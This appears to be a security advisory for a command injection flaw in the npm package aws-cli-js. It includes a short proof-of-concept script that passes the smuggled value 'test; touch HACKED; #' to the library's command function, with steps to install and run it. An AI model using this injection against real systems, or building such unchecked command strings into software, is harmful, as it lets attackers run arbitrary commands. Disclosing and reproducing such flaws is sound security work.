
The issue occurs because a user input is formatted inside a command that will be executed without any check. The issue arises [here](https://github.com/Quobject/aws-cli-js/blob/master/src/index.ts#L28).

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Create the following PoC file:
```js
// poc.js
var awsCli = require('aws-cli-js');
var Options = awsCli.Options;
var Aws = awsCli.Aws;

var options = new Options('your key', 'your key2', 'your token', null);

var aws = new Aws(options);
aws.command('test; touch HACKED; #');

```
2. Check there aren't any files called `HACKED`.
3. Execute the following commands in another terminal:

```bash
npm i aws-cli-js # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created.

## References
- [GitHub Issue](https://github.com/Quobject/aws-cli-js/issues/7)